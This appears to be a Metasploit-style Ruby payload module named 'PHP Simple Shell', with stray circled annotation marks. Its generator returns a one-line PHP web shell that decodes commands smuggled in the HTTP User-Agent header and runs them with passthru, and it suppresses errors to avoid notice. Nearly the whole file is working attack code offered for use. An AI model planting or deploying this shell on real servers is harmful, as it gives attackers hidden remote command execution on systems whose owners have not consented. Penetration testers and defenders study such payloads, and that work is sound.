# This file is part of the Metasploit Framework and may be subject to redistribution and commercial restrictions. Please see the Metasploitweb site for more information on licensing and terms of use.  http://metasploit.com/
require 'msf/core'
require 'msf/core/payload/php'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
module Metasploit3
	include Msf::Payload::Single
	include Msf::Payload::Php
	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'PHP Simple Shell ',
			'Version'       => '$Revision: 14774 $',
			'Description'   => 'Get a simple php shell',
			'Author'        => [ 'binghe911' ],
			'License'       => BSD_LICENSE,
			'Platform'      => 'php',
			'Arch'          => ARCH_PHP
			))                                             ①
	end
	def php_shell
		shell = <<-END_OF_PHP_CODE
		<?php error_reporting(0);print(_code_);passthru(base64_decode(\$_SERVER[HTTP_USER_AGENT]));die; ?>
		END_OF_PHP_CODE                                  ②
		return Rex::Text.compress(shell)
	end
	#
	# Constructs the payload
	#
	def generate
		return php_shell
	end
end
